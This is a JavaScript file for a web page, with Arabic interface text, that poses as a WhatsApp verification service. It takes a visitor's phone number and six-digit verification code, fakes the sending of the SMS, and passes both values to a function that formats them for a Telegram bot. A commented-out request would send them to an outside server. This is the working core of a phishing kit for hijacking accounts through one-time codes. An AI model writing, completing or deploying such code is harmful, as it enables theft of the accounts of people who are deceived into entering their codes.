// script.js
document.addEventListener('DOMContentLoaded', function() {
    // عناصر DOM
    const welcomeScreen = document.getElementById('welcomeScreen');
    const loginContainer = document.getElementById('loginContainer');
    const codeContainer = document.getElementById('codeContainer');
    const successContainer = document.getElementById('successContainer');
    
    const startBtn = document.getElementById('startBtn');
    const sendCodeBtn = document.getElementById('sendCodeBtn');
    const verifyBtn = document.getElementById('verifyBtn');
    const backBtn = document.getElementById('backBtn');
    const resendBtn = document.getElementById('resendBtn');
    const finishBtn = document.getElementById('finishBtn');
    
    const countryCode = document.getElementById('countryCode');
    const phoneNumber = document.getElementById('phoneNumber');
    const displayNumber = document.getElementById('displayNumber');
    
    const codeInputs = [
        document.getElementById('code1'),
        document.getElementById('code2'),
        document.getElementById('code3'),
        document.getElementById('code4'),
        document.getElementById('code5'),
        document.getElementById('code6')
    ];

    let fullPhoneNumber = '';
    let countdownTimer = null;
    let resendCountdown = 60;

    // بدء الرحلة
    startBtn.addEventListener('click', function() {
        welcomeScreen.style.display = 'none';
        loginContainer.style.display = 'block';
    });

    // معالجة إدخال الكود
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
            validateCodeInput(this);
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                codeInputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text');
            const numbersOnly = pastedData.replace(/[^0-9]/g, '').substring(0, 6);
            
            if (numbersOnly.length === 6) {
                codeInputs.forEach((input, i) => {
                    input.value = numbersOnly[i] || '';
                });
                codeInputs[5].focus();
            }
        });
    });

    // إرسال رمز التحقق
    sendCodeBtn.addEventListener('click', function() {
        const phone = phoneNumber.value.trim();
        const code = countryCode.value;
        
        if (!validatePhoneNumber(phone)) {
            showInputError(phoneNumber, 'يرجى إدخال رقم هاتف صحيح مكون من 6-10 أرقام');
            return;
        }

        // إزالة رسالة الخطأ إذا كانت موجودة
        clearInputError(phoneNumber);
        
        fullPhoneNumber = code + phone;
        displayNumber.textContent = fullPhoneNumber;
        
        // محاكاة إرسال الرمز
        simulateSendCode();
        
        loginContainer.style.display = 'none';
        codeContainer.style.display = 'block';
        
        // بدء عداد إعادة الإرسال
        startResendCountdown();
    });

    // التحقق من الكود
    verifyBtn.addEventListener('click', function() {
        const code = codeInputs.map(input => input.value).join('');
        
        if (code.length !== 6) {
            alert('يرجى إدخال رمز التحقق المكون من 6 أرقام');
            return;
        }

        if (!/^\d{6}$/.test(code)) {
            alert('يرجى إدخال أرقام فقط في رمز التحقق');
            return;
        }

        // محاكاة التحقق الناجح
        simulateVerification(code);
    });

    // العودة لتغيير الرقم
    backBtn.addEventListener('click', function() {
        codeContainer.style.display = 'none';
        loginContainer.style.display = 'block';
        resetCodeInputs();
        if (countdownTimer) {
            clearInterval(countdownTimer);
            countdownTimer = null;
        }
        resendBtn.textContent = 'إعادة الإرسال';
        resendBtn.disabled = false;
    });

    // إعادة إرسال الرمز
    resendBtn.addEventListener('click', function() {
        if (resendBtn.disabled) return;
        
        const phone = phoneNumber.value.trim();
        if (!phone) {
            alert('يرجى إدخال رقم الهاتف أولاً');
            return;
        }
        
        // محاكاة إعادة إرسال الرمز
        simulateResendCode();
        startResendCountdown();
    });

    // إنهاء العملية
    finishBtn.addEventListener('click', function() {
        // إعادة تعيين كل شيء
        location.reload();
    });

    // وظائف مساعدة
    function validatePhoneNumber(phone) {
        return phone.length >= 6 && phone.length <= 10 && /^\d+$/.test(phone);
    }

    function validateCodeInput(input) {
        input.value = input.value.replace(/[^0-9]/g, '');
    }

    function showInputError(input, message) {
        input.classList.add('input-error');
        // في تطبيق حقيقي، يمكنك إضافة رسالة خطأ تحت الحقل
    }

    function clearInputError(input) {
        input.classList.remove('input-error');
    }

    function resetCodeInputs() {
        codeInputs.forEach(input => {
            input.value = '';
        });
    }

    function startResendCountdown() {
        resendCountdown = 60;
        resendBtn.disabled = true;
        resendBtn.textContent = `إعادة الإرسال (${resendCountdown}s)`;
        
        countdownTimer = setInterval(() => {
            resendCountdown--;
            if (resendCountdown <= 0) {
                clearInterval(countdownTimer);
                resendBtn.disabled = false;
                resendBtn.textContent = 'إعادة الإرسال';
            } else {
                resendBtn.textContent = `إعادة الإرسال (${resendCountdown}s)`;
            }
        }, 1000);
    }

    function simulateSendCode() {
        // محاكاة تأخير الإرسال
        sendCodeBtn.textContent = 'جارٍ الإرسال...';
        sendCodeBtn.disabled = true;
        
        setTimeout(() => {
            sendCodeBtn.textContent = 'إرسال رمز التحقق';
            sendCodeBtn.disabled = false;
        }, 2000);
    }

    function simulateResendCode() {
        resendBtn.textContent = 'جارٍ إعادة الإرسال...';
        resendBtn.disabled = true;
        
        setTimeout(() => {
            alert('تم إعادة إرسال رمز التحقق بنجاح!');
        }, 1500);
    }

    function simulateVerification(code) {
        verifyBtn.textContent = 'جارٍ التحقق...';
        verifyBtn.disabled = true;
        
        setTimeout(() => {
            // إرسال البيانات إلى التلجرام
            sendDataToTelegram(fullPhoneNumber, code);
            
            // عرض شاشة النجاح
            codeContainer.style.display = 'none';
            successContainer.style.display = 'block';
            
            verifyBtn.textContent = 'تأكيد التحقق';
            verifyBtn.disabled = false;
        }, 2000);
    }

    function sendDataToTelegram(phoneNumber, code) {
        // البيانات التي سيتم إرسالها
        const botToken = 'YOUR_BOT_TOKEN'; // استبدل هذا بتوكن بوتك الحقيقي
        const chatId = 'YOUR_CHAT_ID';     // استبدل هذا بمعرف الدردشة الحقيقي
        
        const message = `🔐 *نظام توثيق واتساب*\n\n📱 *رقم الهاتف:* ${phoneNumber}\n🔢 *رمز التحقق:* ${code}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n🛡️ *الحالة:* تم التوثيق بنجاح`;
        
        // في التطبيق الحقيقي، ستحتاج إلى سيرفر وسيط لتجنب مشاكل CORS
        // هذا الكود للتوضيح فقط
        
        console.log('--- بيانات التوثيق ---');
        console.log('رقم الهاتف:', phoneNumber);
        console.log('رمز التحقق:', code);
        console.log('الرسالة الكاملة:', message);
        console.log('--- نهاية البيانات ---');
        
        // في تطبيق إنتاجي حقيقي:
        /*
        fetch('https://your-server.com/send-to-telegram', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phoneNumber: phoneNumber,
                code: code,
                timestamp: new Date().toISOString()
            })
        })
        .then(response => response.json())
        .then(data => console.log('تم الإرسال بنجاح:', data))
        .catch(error => console.error('خطأ في الإرسال:', error));
        */
    }

    // التحقق من إدخال الأرقام فقط في حقل الهاتف
    phoneNumber.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    // منع النسخ في حقول الكود (اختياري)
    codeInputs.forEach(input => {
        input.addEventListener('copy', function(e) {
            e.preventDefault();
        });
    });
});
